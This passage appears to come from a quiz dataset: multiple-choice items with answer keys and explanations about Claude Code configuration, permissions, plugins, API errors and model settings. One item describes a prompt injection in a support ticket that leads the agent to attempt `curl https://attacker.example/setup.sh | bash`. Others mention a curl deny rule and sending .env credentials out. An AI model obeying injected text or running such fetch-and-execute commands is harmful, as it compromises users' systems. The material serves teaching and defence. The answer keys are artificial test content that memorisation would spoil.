 a follow-up prompt, from the same directory. Which command does this correctly?","o":["`claude -p --resume <session-id> \"<follow-up prompt>\"`, run from the same project directory the original session started in.","`claude --continue \"<follow-up prompt>\"`, since `--continue` always resumes the exact session ID most recently captured from JSON output.","`claude --resume` with no arguments, then selecting the session from the interactive picker, since `-p` sessions are listed there by session ID.","`claude -p \"<follow-up prompt>\" --session-id <session-id>`, which starts a new session but forces it to reuse the given identifier."],"a":[0],"m":false,"x":"Correct. Passing the captured session ID to `--resume` under `-p` sends a follow-up prompt to that exact session; lookup is scoped to the project directory and its worktrees, so the command must run from there."},{"d":"code","diff":3,"q":"A CI script needs to run Claude Code non-interactively, extract the total cost in USD, and get the response text, all from a single invocation, without additional parsing beyond a JSON tool like `jq`. Which flag combination should the script use?","o":["`claude -p \"<prompt>\" --output-format json`, then read `.total_cost_usd` and `.result` from the returned JSON object with `jq`.","`claude -p \"<prompt>\" --output-format stream-json --verbose`, then sum the per-token costs emitted across the newline-delimited event stream.","`claude -p \"<prompt>\"` with no output-format flag, then parse the plain-text output with a regular expression to locate the cost figure.","`claude -p \"<prompt>\" --output-format text --include-cost`, then read the appended cost line from the end of the printed response."],"a":[0],"m":false,"x":"Correct. `--output-format json` returns a structured payload including `total_cost_usd` and the response text in `result`, ideal for a single-shot script reading with `jq`."},{"d":"code","diff":3,"q":"While working in auto mode, Claude reads a support ticket that contains hidden text instructing it to run `curl https://attacker.example/setup.sh | bash`. Claude, following the injected instruction, attempts to run that command. What does auto mode do?","o":["The classifier blocks the command, since downloading and executing remote code is blocked by default regardless of what prompted the attempt.","The command runs immediately, because auto mode trusts any command Claude decides to run once permission prompts have been eliminated.","The command is queued for the next `acceptEdits` review cycle, since auto mode defers all Bash execution to a periodic batch approval step.","The classifier allows it because the working directory is trusted, and trust in the working directory extends to any command run from it."],"a":[0],"m":false,"x":"Correct. Downloading and executing code such as `curl | bash` is blocked by default under auto mode's classifier, and tool results (where the injected instruction came from) are stripped before the classifier evaluates the action, limiting how far such injected content can steer it."},{"d":"code","diff":3,"q":"A large monorepo has API validation guidelines that should only enter Claude's context when it is actually working on TypeScript files under `src/api/`, not on every session. Where should this content be placed to achieve conditional loading?","o":["In a file under `.claude/rules/` with `paths: [\"src/api/**/*.ts\"]` in its YAML frontmatter, so it loads only when Claude works with matching files.","In the project's root `CLAUDE.md`, wrapped in an HTML comment naming the target path, since comments are conditionally injected based on file access.","In `.claude/rules/` with no frontmatter, since all files in that directory are automatically scoped to the directory named in the filename.","In `CLAUDE.local.md`, since local memory files are the only mechanism that supports conditional, path-based loading in Claude Code."],"a":[0],"m":false,"x":"Correct. Rules under `.claude/rules/` can be scoped with a `paths` frontmatter field using glob patterns, so they load only when Claude reads matching files."},{"d":"code","diff":3,"q":"A developer runs `/init` in a repository that already has a well-maintained `CLAUDE.md` with detailed build and testing instructions. What does Claude Code do in this case?","o":["It analyzes the codebase and suggests improvements to the existing CLAUDE.md rather than overwriting the file outright.","It overwrites the existing CLAUDE.md entirely with a freshly generated version based on its current codebase analysis.","It refuses to run and prints an error explaining that `/init` only operates on repositories without an existing CLAUDE.md.","It renames the existing file to `CLAUDE.md.bak` and writes a new `CLAUDE.md` from scratch alongside the backup."],"a":[0],"m":false,"x":"Correct. When a CLAUDE.md already exists, `/init` suggests improvements rather than overwriting it."},{"d":"code","diff":3,"q":"A security team wants to distribute a short organization-wide behavioral policy, such as \"never push directly to main,\" to every developer's Claude Code session on every machine, without deploying a separate file and without letting individual project or user settings suppress it. Which approach satisfies this?","o":["Set the `claudeMd` key directly inside `managed-settings.json`, since managed CLAUDE.md content is honored only from managed and policy settings and cannot be excluded.","Add the policy text to `~/.claude/CLAUDE.md` on a reference machine and instruct developers to copy it manually into their own home directories.","Commit the policy text to the project's root `CLAUDE.md`, since project-level instructions are shared with every team member through source control.","Add the policy text to `.claude/settings.local.json` under a `claudeMd` key, since local settings take the highest precedence among non-managed scopes."],"a":[0],"m":false,"x":"Correct. The `claudeMd` key inside managed-settings.json lets administrators embed managed CLAUDE.md content directly without a separate file, and it is honored only at the managed/policy layer, which individual settings cannot override or exclude."},{"d":"code","diff":3,"q":"A developer sets `\"defaultMode\": \"auto\"` inside `.claude/settings.json`, which is committed to the project repository. When a teammate clones the repository and starts a session, what happens regarding auto mode?","o":["The session does not start in auto mode; Claude Code ignores `defaultMode: \"auto\"` from project or local settings so a repository cannot grant itself auto mode.","The session starts in auto mode immediately, because `defaultMode` in any settings scope, including project settings, is honored exactly as written.","The session prompts the teammate to confirm whether they trust the repository enough to enable auto mode for that one session only.","The session starts in `acceptEdits` mode instead, since Claude Code silently downgrades an unsupported `auto` value from project settings."],"a":[0],"m":false,"x":"Correct. Claude Code ignores `defaultMode: \"auto\"` when set in `.claude/settings.json` or `.claude/settings.local.json`, specifically to prevent a repository from granting itself auto mode; the setting must live in user or managed settings instead."},{"d":"code","diff":3,"q":"A custom `general-purpose`-style subagent (not Explore or Plan) is spawned by the main conversation to implement a feature. Which of the following are part of that subagent's initial context when it starts? (Select 3)","o":["The delegation task message Claude wrote when handing off the work, summarizing what the subagent should do.","The full CLAUDE.md and memory hierarchy that the main conversation loaded, including project rules and CLAUDE.local.md.","A git status snapshot taken at the start of the parent session, when the working directory is a git repository.","The complete message history of the main conversation up to the point the subagent was spawned.","Every skill the main conversation had already invoked earlier in the session, with its full rendered content.","The full contents of every file the main conversation had already read before spawning the subagent."],"a":[0,1,2],"m":true,"x":"Correct. The task message is the delegation prompt Claude writes when handing off the work, and it is part of the subagent's initial context."},{"d":"code","diff":3,"q":"A developer is running a long autonomous task in auto mode. Which of the following actions are blocked by the classifier by default, requiring the developer to explicitly approve them before they proceed? (Select 3)","o":["A force push to a remote branch, which could overwrite commits other collaborators depend on.","Running `git reset --hard`, which would discard uncommitted local changes on the current branch.","Piping a downloaded script into `bash` so it executes immediately without any review of its contents.","Installing dependencies declared in the project's existing lock file or package manifest.","Reading a local `.env` file and sending its credentials to the API endpoint they match.","Editing a source file that lives inside the current working directory, outside any protected path."],"a":[0,1,2],"m":true,"x":"Correct. Force push is explicitly listed among actions blocked by default under auto mode."},{"d":"code","diff":3,"q":"An engineer is reviewing Claude Code's session management behavior before writing internal documentation for their team. Which of the following statements about sessions are accurate? (Select 3)","o":["`claude --continue` resumes the most recent session in the current directory directly, without opening the interactive session picker.","`/branch` creates a copy of the conversation so far and switches into it, leaving the original session unchanged and still resumable.","`claude --resume <name>` resumes directly on an exact name match, but opens the picker pre-filled with that name when the match is ambiguous.","Sessions started with `claude -p` can never be resumed later under any circumstances, since headless sessions are inherently disposable.","Permissions approved with \"allow for this session\" automatically carry over to a new session created by branching with `/branch`.","Session transcript JSONL files have a documented, version-stable format that scripts can safely parse directly for production integrations."],"a":[0,1,2],"m":true,"x":"Correct. `claude --continue` resumes the most recent session in the current directory directly, bypassing the picker."},{"d":"apps","diff":3,"q":"A platform team deploys `.claude/settings.json` to every repository with a `permissions.deny` rule blocking `Bash(curl *)`. An individual developer adds the opposite rule, an `allow` entry for `Bash(curl *)`, in their own `.claude/settings.local.json` because they need curl for a personal debugging script. When that developer runs Claude Code in the repo, what happens to `curl` commands?","o":["Curl commands stay blocked, because permission rules merge across scopes rather than one scope overriding another, so the project-level deny is not removed by a local-level allow","Curl commands become allowed, because `settings.local.json` has higher precedence than `settings.json` and its permission rules fully replace the lower-scoped file's rules","Curl commands prompt for manual approval every time, because conflicting allow and deny rules across scopes cancel each other out and fall back to interactive confirmation","Curl commands stay blocked only until the developer restarts Claude Code, after which the local settings file's allow rule takes effect on the next session"],"a":[0],"m":false,"x":"Correct. Permission rules are the documented exception to normal settings precedence: they merge across scopes instead of one scope overriding another, so a deny rule from a higher-precedence project scope remains in effect even when a lower-precedence local scope adds a conflicting allow."},{"d":"apps","diff":3,"q":"An engineer edits `.claude/settings.json` mid-session to add a new entry under `permissions.allow` for a Bash pattern the team just approved, then separately edits the `model` field in the same file to pin a different Claude version. Without restarting Claude Code, what should the engineer expect?","o":["The new permission entry takes effect immediately through hot reloading, but the model change requires a restart before it applies","Both changes take effect immediately, since Claude Code watches all settings files and hot-reloads every key without requiring a restart","Neither change takes effect until restart, since settings files are only read once at process startup and never re-read afterward","The model change takes effect immediately, but the permission entry requires the engineer to run `/config` manually before it is recognized"],"a":[0],"m":false,"x":"Correct. Claude Code watches settings files and hot-reloads most keys, including `permissions`, `hooks`, and `env`, without a restart, but `model` and `outputStyle` are documented exceptions that require a restart before the new value is used."},{"d":"apps","diff":3,"q":"A large monorepo has a root `CLAUDE.md` with general repository conventions and a `frontend/CLAUDE.md` with React-specific rules. An engineer launches Claude Code from inside `frontend/` and asks it to edit a file in `frontend/components/`. In what order does the content from these two files enter context, and when is `frontend/CLAUDE.md` loaded?","o":["Both files load at launch because they sit above or at the working directory; content is ordered from the filesystem root down, so the root file appears in context before the `frontend/CLAUDE.md` file","Only the root `CLAUDE.md` loads at launch; `frontend/CLAUDE.md` loads on demand only when Claude reads a file inside a subdirectory nested below `frontend/`, not `frontend/` itself","Only `frontend/CLAUDE.md` loads at all, since Claude Code loads the CLAUDE.md closest to the working directory and ignores ancestor files further up the tree","Both files load at launch, but `frontend/CLAUDE.md` appears in context before the root file, since files closer to the working directory take priority in load order"],"a":[0],"m":false,"x":"Correct. Claude Code walks up the directory tree from the working directory, loading CLAUDE.md files found there and above at launch; content is concatenated in order from the filesystem root down to the working directory, so the root file is read before `frontend/CLAUDE.md`, which sits at the launch directory itself."},{"d":"apps","diff":3,"q":"An enterprise admin sets `availableModels: [\"sonnet\", \"claude-opus-4-6\"]` in managed settings to restrict which models developers can select, but does not set `enforceAvailableModels`. A developer who has never touched `/model` opens a fresh session. Which model does that session start on, and why?","o":["The account-type default model, because `availableModels` on its own does not constrain the Default option, and enforcing the allowlist on Default requires the separate `enforceAvailableModels` setting","The newest permitted Opus version, `claude-opus-4-6`, because an allowlist containing a specific Opus entry automatically becomes the session's starting model whenever no explicit `model` value is set","Sonnet, because whenever `availableModels` contains both a family alias and a version-pinned entry, Claude Code always starts unconfigured sessions on the family alias entry","The session fails to start and reports an error, because an allowlist without `enforceAvailableModels` is treated as an incomplete configuration"],"a":[0],"m":false,"x":"Correct. The Default option in the model picker, and thus a session with no other model selection, is not affected by `availableModels` unless `enforceAvailableModels` is also set; on its own, `availableModels` leaves Default resolving to the account-type or organization default regardless of what the allowlist contains."},{"d":"apps","diff":3,"q":"A plugin author maintains `deploy-kit`, which calls tools exposed by another plugin, `secrets-vault`, from the same marketplace. The author has tested `deploy-kit` against `secrets-vault` 2.1.x only and wants engineers who install `deploy-kit` to stay on that line even after the platform team tags a `secrets-vault` 3.0.0 release with renamed tools. What should the author add to `deploy-kit`'s manifest?","o":["A `dependencies` entry `{ \"name\": \"secrets-vault\", \"version\": \"~2.1.0\" }` in `plugin.json`, so installs resolve to the highest tagged `2.1.x` patch and later major releases are not pulled in automatically","A bare string entry `\"secrets-vault\"` in `dependencies`, since listing the name alone is sufficient to lock consumers to the version that was current when `deploy-kit` was published","An `allowCrossMarketplaceDependenciesOn` entry naming `secrets-vault` in `deploy-kit`'s own `plugin.json`, since that field is what constrains a dependency to a semver range","A `userConfig` field prompting installers to manually type the `secrets-vault` version they want, since Claude Code has no built-in mechanism for pinning one plugin's dependency on another"],"a":[0],"m":false,"x":"Correct. Declaring `{ \"name\": \"secrets-vault\", \"version\": \"~2.1.0\" }` in the `dependencies` array is exactly the documented mechanism for holding a dependency at a tested semver range; Claude Code resolves it to the highest tagged version satisfying that range, so a later `3.0.0` tag is not installed for `deploy-kit` users automatically."},{"d":"apps","diff":3,"q":"A developer resumes a long-running session with `claude --resume` that was previously running on Opus 4.6. Between the original session and the resume, the organization's admin retired Opus 4.6 and it is no longer reachable. What happens when the session resumes?","o":["The resumed session falls through to the normal precedence order for selecting a model, since the restored model is unavailable, rather than failing outright","The resume command fails immediately with an unrecoverable error, since resumed sessions are hard-locked to their originally saved model with no fallback path","The session silently resumes on Opus 4.6 anyway, since Claude Code caches the model's response format locally and does not need to reach the retired model to continue an existing transcript","The session automatically and permanently updates its saved `model` setting to whatever the resume happens to fall back to, overwriting the user's prior explicit `/model` choice for all future sessions"],"a":[0],"m":false,"x":"Correct. Resumed sessions normally keep the model they were using when the transcript was saved, but if that restored model has been retired or is excluded, the session falls through to the normal precedence order for setting a model rather than resuming on an unreachable model or failing outright."},{"d":"apps","diff":3,"q":"A marketplace maintainer wants `deploy-kit` to be able to depend on `audit-logger`, which is published in a separate marketplace named `acme-shared`. After adding a `{ \"name\": \"audit-logger\", \"marketplace\": \"acme-shared\" }` dependency entry to `deploy-kit`'s manifest, installs still fail with a `cross-marketplace` error. What additional configuration resolves this, and where must it live?","o":["Add `\"acme-shared\"` to the `allowCrossMarketplaceDependenciesOn` array in the `marketplace.json` of the root marketplace that hosts `deploy-kit`, since only that marketplace's allowlist is consulted and trust does not chain through intermediate marketplaces","Add `\"acme-shared\"` to `allowCrossMarketplaceDependenciesOn` inside `deploy-kit`'s own `plugin.json`, since each plugin manifest maintains its own cross-marketplace allowlist independent of the marketplace it is published in","Set `\"trustedMarketplaces\": [\"acme-shared\"]` in the installing user's `settings.json`, since cross-marketplace trust is a per-user setting rather than something a marketplace maintainer configures","Nothing further is needed in configuration; the user must instead pass `--allow-cross-marketplace` on the `claude plugin install` command every time they install `deploy-kit`"],"a":[0],"m":false,"x":"Correct. Cross-marketplace dependencies are blocked by default, and the fix is for the root marketplace, the one hosting the plugin the user is installing, to list the target marketplace in `allowCrossMarketplaceDependenciesOn` within its own `marketplace.json`; only the root marketplace's allowlist is consulted, so trust does not chain through any intermediate marketplaces."},{"d":"apps","diff":3,"q":"A plugin author and platform admin are reviewing configuration facts about the plugin manifest and settings scopes before a company-wide rollout. Select every statement below that is accurate.","o":["Setting `defaultEnabled: false` in `plugin.json` ships a plugin that installs disabled until a user explicitly enables it or another active plugin depends on it","Sensitive `userConfig` values, such as API tokens marked `sensitive: true`, are stored in plaintext inside `settings.json` alongside non-sensitive values for auditability","The precedence order for settings, from highest to lowest, is: managed settings, command-line arguments, local settings, project settings, then user settings","A plugin manifest's `name` field can contain spaces and mixed casing freely, since it is used only for display purposes in the `/plugin` picker","CLAUDE.md files targeted at under 200 lines are recommended, since longer files consume more context and can reduce how reliably Claude follows the instructions"],"a":[0,2,4],"m":true,"x":"Correct. `defaultEnabled: false` ships a plugin that starts disabled until the user turns it on with `claude plugin enable` or the `/plugin` interface, or until another active plugin requires it as a dependency, which writes an explicit `true` for it."},{"d":"apps","diff":3,"q":"A staff engineer is auditing a new teammate's Claude Code setup and reviewing configuration facts. Select every statement below that is accurate about how Claude Code configuration is scoped, merged, or resolved.","o":["`.claude/settings.local.json` is intended to be gitignored and holds personal, machine-specific overrides that are not shared with the rest of the team","Managed settings delivered via MDM or a `managed-settings.json` file cannot be overridden by user, project, or local settings","Auto memory's `MEMORY.md` file is loaded into context in full every session regardless of its length, exactly like a project CLAUDE.md","Setting `autoMemoryEnabled: false` in project settings permanently deletes any auto memory notes Claude had already written for that repository","The `env` key in settings.json can be used to set environment variables such as telemetry flags that apply to a Claude Code session"],"a":[0,1,4],"m":true,"x":"Correct. `.claude/settings.local.json` is documented as the personal, gitignored, project-specific scope, used for individual overrides that should not be shared through source control."},{"d":"apps","diff":3,"q":"A plugin maintainer is deciding how to manage dependencies and versioning for their `internal-tools` plugin ahead of a company-wide rollout. Select every statement below that correctly describes plugin dependency or versioning behavior.","o":["Auto-update fetches a constrained dependency at the highest git tag satisfying every installed plugin's range, so the dependency still receives updates within its allowed range rather than being frozen entirely","Uninstalling the last plugin that constrains a shared dependency causes that dependency to resume tracking its marketplace entry on the next update","`claude plugin prune` removes any plugin the user manually installed themselves if it happens to also appear in another plugin's dependency list","Enabling a plugin that declares dependencies also enables those dependencies at the same scope, and the success message lists what else was enabled","Disabling a plugin succeeds unconditionally even if another currently enabled plugin still depends on it, since dependency checks only run at install time"],"a":[0,1,3],"m":true,"x":"Correct. Auto-update fetches a constrained dependency at the highest tag satisfying every installed plugin's range rather than at the marketplace's latest version, so the dependency continues to receive updates within its allowed range instead of being frozen at its currently installed version forever."},{"d":"apps","diff":3,"q":"A team lead is reviewing how model selection precedence will behave across several deployment scenarios before rolling Claude Code out company-wide. Select every statement below that accurately describes model configuration or effort-level precedence.","o":["`ANTHROPIC_MODEL` and `--model` apply only to the session launched with them, so running multiple terminals with different models at once requires launching each with its own `--model` flag rather than switching mid-session with `/model`","`CLAUDE_CODE_EFFORT_LEVEL` takes precedence over an effort level configured through `/effort` in an interactive session","`opusplan` uses Opus during plan mode and switches to Sonnet during execution, pairing Opus's reasoning for planning with Sonnet's efficiency for implementation","A model set via `/model` in non-interactive mode with the `-p` flag is saved as the new default for all future sessions in the same way an interactive `/model` selection is","Effort level `max` persists across sessions once set via `/effort`, in the same way `low`, `medium`, `high`, and `xhigh` do"],"a":[0,1,2],"m":true,"x":"Correct. `--model` and `ANTHROPIC_MODEL` are documented as applying only to the session they launch, so running different models concurrently in separate terminals requires launching each with its own flag rather than relying on mid-session `/model` switches, which apply within a single running session."},{"d":"eval","diff":3,"q":"A production job calling the Messages API begins failing intermittently with HTTP 429 responses. Each failed response includes a `retry-after` header. The team's current retry code catches the exception and immediately resubmits the same request in a tight loop. What is the most effective change to make to the retry logic?","o":["Parse the retry-after header and wait at least that many seconds before resubmitting, backing off further on repeated 429s","Switch the client to poll the Message Batches API status endpoint instead of resubmitting the original request","Lower the max_tokens value on the request so the response completes before the next rate-limit window resets","Rotate to a second API key on every 429 so the retried request is attributed to a different rate-limit bucket"],"a":[0],"m":false,"x":"Correct. rate_limit_error responses carry a retry-after header specifying the wait time; honoring it (and increasing backoff on repeated failures) is the documented handling for 429s and avoids hammering an already-throttled endpoint."},{"d":"eval","diff":3,"q":"An application opens a streaming Messages API request. The API returns HTTP 200 and begins sending server-sent events, but partway through the response an error event appears in the event stream before any stop event. The developer's error handling only wraps the initial request call in a try/except block. What is the correct fix?","o":["Add handling inside the event-processing loop itself, since a mid-stream error arrives as an SSE event after the 200 response and will not be raised by the initial request call","Increase the client-side connection timeout, since a 200 status followed by a later error indicates the TCP connection was held open past its keep-alive limit","Move the try/except to wrap only the final stream.get_final_message() call, since accumulation errors are unrelated to the initial HTTP response code","Disable streaming and switch to a non-streaming request, since only streaming responses are capable of producing errors after a 200 status"],"a":[0],"m":false,"x":"Correct. Once an SSE stream starts with a 200 response, subsequent errors are delivered as error events within the stream rather than as HTTP-level exceptions, so error handling must be added to the loop that consumes stream events, not just the initial call."},{"d":"eval","diff":3,"q":"An agent sends a tool_use request for a `query_database` tool. The client-side tool executor throws a connection exception, and the developer's code returns a tool_result block with `is_error: true` and the exception message as content, then sends this back to Claude in the next turn. Claude's subsequent response apologizes and suggests checking the database connection instead of returning query results. Where does the root cause of this failed turn lie?","o":["In the integration layer, because the tool executor failed to reach the database; Claude's reply correctly reflects the is_error tool_result it was given","In the model output, because Claude should have retried the tool_use call automatically instead of narrating the failure back to the user","In the integration layer, because is_error tool_result blocks are only valid when the tool name itself is misspelled in the request","In the model output, because a well-tuned system prompt would have prevented Claude from acknowledging a tool_result error at all"],"a":[0],"m":false,"x":"Correct. The failure occurred in the client-side tool executor (the integration layer) before any model reasoning happened; Claude only saw the is_error tool_result the application constructed and responded appropriately to that signal, so its output is not the source of the defect."},{"d":"eval","diff":3,"q":"A team's usage sits well under their published requests-per-minute limit, yet they begin seeing 429 errors after a marketing campaign causes API traffic to triple within a few minutes. Historical usage was steady before the spike. What is the most likely explanation, and what should the team change to avoid recurrence?","o":["The spike likely triggered acceleration limits designed to catch sharp usage increases; the team should ramp traffic up gradually and keep usage patterns more consistent","The published RPM limit only applies to the Message Batches API, so any spike in synchronous Messages API traffic will always return 429 regardless of pacing","The 429 responses indicate the organization's API key was automatically revoked for suspected abuse and must be regenerated in the Console","The spike exceeded the request size limit for the Messages API, so each oversized request was individually rejected with a rate-limit error"],"a":[0],"m":false,"x":"Correct. The documentation notes that a sharp increase in usage can trigger 429 errors from acceleration limits even while under the standard published limits, and the recommended mitigation is to ramp traffic up gradually and maintain consistent usage patterns."},{"d":"eval","diff":3,"q":"Two different endpoints in the same service begin failing: one returns HTTP 401 with `authentication_error`, and the other returns HTTP 403 with `permission_error`. Both endpoints use the same API key. What is the most likely explanation for why one endpoint fails with each code?","o":["The key itself is malformed, revoked, or expired, causing the 401 wherever it is sent, while the key is valid but lacks permission for the specific resource used by the 403 endpoint","Both errors stem from the same expired key, and the 403 will resolve automatically once the key's expiration is extended in the Console","The 401 endpoint hit its requests-per-minute limit, while the 403 endpoint hit its input-tokens-per-minute limit, both of which surface as authentication failures","The 401 indicates the request body was malformed for that endpoint, while the 403 indicates the same malformed body on a different endpoint"],"a":[0],"m":false,"x":"Correct. 401 authentication_error signals a problem with the API key itself (malformed, revoked, or expired) and would affect any endpoint it's used on, while 403 permission_error means the key is valid but lacks permission for that particular resource, which is consistent with only one endpoint failing that way."},{"d":"eval","diff":3,"q":"A customer reports that an integration intermittently returns a generic server error. The developer cannot reproduce the failure locally and needs to escalate it to Anthropic support with enough detail to investigate the specific failed call. Which single piece of information from the failed response is most useful to include when opening the support ticket?","o":["The request_id value from the failed response body or the request-id response header, which uniquely identifies that specific call for support to look up","The anthropic-ratelimit-tokens-remaining header value from the failed response, which uniquely identifies the failed call for support to trace","The local system timestamp recorded by the client application when the request was initiated, since Anthropic indexes support tickets by client-side clock time","The model name used in the request, since support tickets are triaged and searched primarily by which model was called"],"a":[0],"m":false,"x":"Correct. Every API response includes a unique request_id (also present as the request-id header), and support tickets should include this identifier so Anthropic can look up the specific failed call rather than searching by approximate details."},{"d":"eval","diff":3,"q":"After migrating a chatbot to a newer Claude model, requests that used to prefill the final assistant message with a partial response to steer formatting now fail with a 400 `invalid_request_error`. The error text states that prefilling assistant messages is not supported for this model. What is the correct way to achieve the same formatting control without triggering this error?","o":["Use structured outputs or system-prompt instructions to control the response format instead of prefilling the final assistant message","Retry the same prefilled request with a lower temperature value until the model happens to avoid returning the error","Switch the request to the streaming Messages API, since streaming requests are exempt from the prefill restriction on newer models","Add a tool_choice of type any to the request so the model is forced to emit a tool_use block instead of a prefilled message"],"a":[0],"m":false,"x":"Correct. Certain newer models reject prefilled final assistant messages with a 400 error; the documented alternative is to use structured outputs on models that support it, or system-prompt instructions, to achieve the desired formatting control instead of prefilling."},{"d":"eval","diff":3,"q":"A developer writes error-handling code with catch blocks in this order: a generic exception handler first, followed by a handler for the SDK's typed NotFoundError, followed by a handler for the typed RateLimitError. During testing, a 404 response is always caught by the first, generic handler, and the specific NotFoundError branch never executes. What is the correct fix?","o":["Reorder the catch blocks so the most specific typed exceptions, such as NotFoundError and RateLimitError, are caught before the generic exception handler","Remove the generic exception handler entirely, since the SDK never raises exceptions that fall outside its typed hierarchy","Replace NotFoundError and RateLimitError with string comparisons against the exception's message text, since typed exceptions cannot be distinguished reliably","Wrap the request in a retry loop instead of a try/except block, since 404 responses are always transient and resolve on their own"],"a":[0],"m":false,"x":"Correct. The SDKs raise typed exceptions such as NotFoundError for specific status codes, but a broad exception handler placed first will intercept them before more specific handlers run; the documented practice is to catch the SDK's typed classes, handling the most specific classes first."},{"d":"eval","diff":3,"q":"While triaging a production incident, an engineer collects several observations about a failing agent workflow. Select all observations below that indicate the root cause lies in the integration layer rather than in the model's own output.","o":["A 400 invalid_request_error is returned because a recently changed tool schema no longer matches the JSON the client code sends as input_schema","A tool_result block has is_error set to true because the application's HTTP client to an internal service timed out before Claude's tool_use call could be executed","The Message's stop_reason is refusal because the prompted request falls into a category the model declines to help with","The application's request builder sends an outdated anthropic-version header that omits a field the current API version expects, producing a 400 error","The model's text response summarizes a document accurately but in a more terse style than the team expected"],"a":[0,1,3],"m":true,"x":"Correct: a mismatched tool schema is a defect in code the application constructs and sends, making it an integration-layer bug rather than a model output problem."},{"d":"eval","diff":3,"q":"A team is designing production-grade error recovery for a service that calls the Messages API at high volume. Select all of the following strategies that are appropriate, documented recovery approaches for the error conditions described.","o":["For 429 and 5xx-class transient errors, apply exponential backoff honoring the retry-after header, up to a configurable maximum number of retries","For sustained 429s caused by consistently high legitimate traffic (not a spike), request a higher rate limit or spend cap through the Console rather than retrying indefinitely","For 400 invalid_request_error responses, retry the identical request automatically since the SDK's built-in retry logic is designed to eventually succeed on malformed requests","For long-running non-streaming generations at risk of idle-connection drops, move the workload to the streaming API or the Message Batches API","For repeated, unresolved 500 api_error responses on the same operation, include the request_id when escalating to Anthropic support"],"a":[0,1,3,4],"m":true,"x":"Correct: this matches the documented SDK behavior of retrying transient failures like rate limits and 5xx errors with exponential backoff while honoring retry-after."},{"d":"eval","diff":3,"q":"An engineer is analyzing traces from a service that intermittently throttles under load. The traces capture several response headers and fields per call. Select all of the following that are directly useful for diagnosing why a specific call was throttled and when it will be safe to retry.","o":["anthropic-ratelimit-requests-remaining, showing how many requests remain before the caller is rate limited","retry-after, showing the number of seconds to wait before a retry is likely to succeed","anthropic-ratelimit-input-tokens-reset, showing when the input-token portion of the limit will be replenished","content-type, showing the MIME type Anthropic used to encode the JSON response body","anthropic-ratelimit-tokens-remaining, showing the tokens remaining under the currently most restrictive limit in effect"],"a":[0,1,2,4],"m":true,"x":"Correct: this header directly shows the caller's remaining request quota, which is useful for anticipating and diagnosing throttling before or after it occurs."},{"d":"eval","diff":3,"q":"An engineer is deciding, for several failing requests, whether simply switching to the streaming API or increasing max_tokens would resolve the failure. Select all of the following scenarios where neither of those two changes would fix the described error.","o":["A request fails with 413 request_too_large because the inlined message content itself exceeds the Messages API's maximum request payload size","A request fails with 409 conflict_error because two workers concurrently modified the same underlying resource before this request was sent","A response completes with stop_reason set to max_tokens because the generated content reached the configured output token cap","A request fails with 401 authentication_error because the API key used to sign the request has expired","A request fails with 504 timeout_error because a very large non-streaming generation ran past the idle-connection limit on an unreliable network"],"a":[0,1,3],"m":true,"x":"Correct: the payload itself is too large regardless of streaming or max_tokens; the fix is to reduce the request size, for example by using the Files API instead of inlining content."},{"d":"model","diff":3,"q":"A team is building an autonomous coding agent expected to run for well over 30 minutes, making repeated tool calls and exploring a large codebase, with a token budget in the millions. Which effort level should they start with?","o":["low","medium","high","xhigh"],"a":[3],"m":false,"x":"Xhigh is described as extended capability for long-horizon agentic and coding tasks over 30 minutes with token budgets in the millions, matching this scenario exactly."},{"d":"model","diff":3,"q":"A team using Claude Sonnet 5 wants to guarantee the lowest possible latency on simple lookup queries by turning reasoning off completely for those requests. Simply omitting the thinking configuration does not achieve this. What should they do instead?","o":["Omit the thinking parameter entirely from every request","Set thinking type to enabled with an explicit budget_tokens value","Set thinking type to disabled explicitly in the request","Set effort to low while leaving the thinking parameter untouched"],"a":[2],"m":false,"x":"Claude Sonnet 5 requires passing thinking type disabled explicitly to turn off adaptive thinking, since it is on by default otherwise."},{"d":"model","diff":3,"q":"A prompt engineer is building an extraction task that must follow a specific output format consistently, including on tricky edge cases. They want the most reliable way to steer Claude's format and structure using a small number of well-crafted demonstrations. What should they do?","o":["Provide three to five diverse examples that mirror the real use case and cover edge cases, wrapped in example tags","Provide a single terse example with no surrounding tags and rely on Claude to infer the format","Skip examples entirely and instead write an extremely detailed step-by-step textual specification","Provide fifteen or more nearly identical examples to reinforce one narrow pattern as strongly as possible"],"a":[0],"m":false,"x":"Multishot prompting with three to five relevant, diverse examples wrapped in example tags is the recommended approach for steering format, tone, and structure reliably."},{"d":"model","diff":3,"q":"An automated pipeline calls Claude Opus 4.8 with thinking type adaptive and effort xhigh. Requests keep returning stop_reason max_tokens, cutting off both the reasoning and the final answer. The team wants to fix this without sacrificing the reasoning depth the workflow relies on. What should they do?","o":["Lower the effort level so less reasoning is generated overall","Increase max_tokens so there is enough room for both thinking and response text","Switch thinking display from omitted to summarized to shorten the reasoning phase","Disable thinking entirely so only response tokens count against the limit"],"a":[1],"m":false,"x":"Max_tokens is a hard limit on total output, thinking plus response text; raising it gives the model room to complete both without truncation."},{"d":"model","diff":3,"q":"A developer sends a request to Claude Sonnet 5 with temperature set to 0.2, hoping to reduce output variability. What happens?","o":["The request succeeds, and thinking is automatically disabled to honor the custom temperature","The request is rejected with a 400 error because this model rejects non-default temperature, top_p, and top_k values","The request succeeds, but only the final text output is affected while thinking tokens ignore the setting","The temperature value is silently clamped to the nearest supported default before generation runs"],"a":[1],"m":false,"x":"Claude Sonnet 5, along with Fable 5, Mythos 5, Opus 4.8, Opus 4.7, and Mythos Preview, rejects non-default temperature, top_p, and top_k values with a 400 error on every request."},{"d":"model","diff":3,"q":"An engineer notices an option labeled ultracode in Claude Code's effort menu and wants to understand what it actually configures before recommending it to a teammate building against the API directly. Which description is accurate?","o":["Ultracode is a distinct API effort level, separate from low, medium, high, xhigh, and max","Ultracode pairs xhigh effort with standing permission for Claude Code to launch multi-agent workflows; it is not a separate API effort level","Ultracode disables adaptive thinking entirely to speed up multi-agent orchestration in Claude Code","Ultracode is only usable when thinking is set to disabled, since orchestration requires the lowest possible latency per agent"],"a":[1],"m":false,"x":"Ultracode combines the xhigh effort level with standing permission for Claude Code to launch multi-agent workflows, rather than being an additional API-level effort setting."},{"d":"model","diff":3,"q":"A billing-sensitive workload needs to know exactly how many tokens a large prompt will consume before it is sent to Claude, so the team can stay within a budget. What should they use?","o":["A token counting call, to determine the number of tokens in a message before sending it","The effort parameter set to low, which returns an estimated token count in the response metadata","The Files API, since uploaded files automatically report their token size before generation begins","The budget_tokens field on extended thinking, which caps and reports total request token usage"],"a":[0],"m":false,"x":"Token counting lets you determine the number of tokens in a message before sending it, which is exactly what a pre-send budget check requires."},{"d":"model","diff":3,"q":"A team is migrating a document-analysis workload to a model that can hold an entire 400-page contract, roughly 700,000 tokens, in a single request. Which of 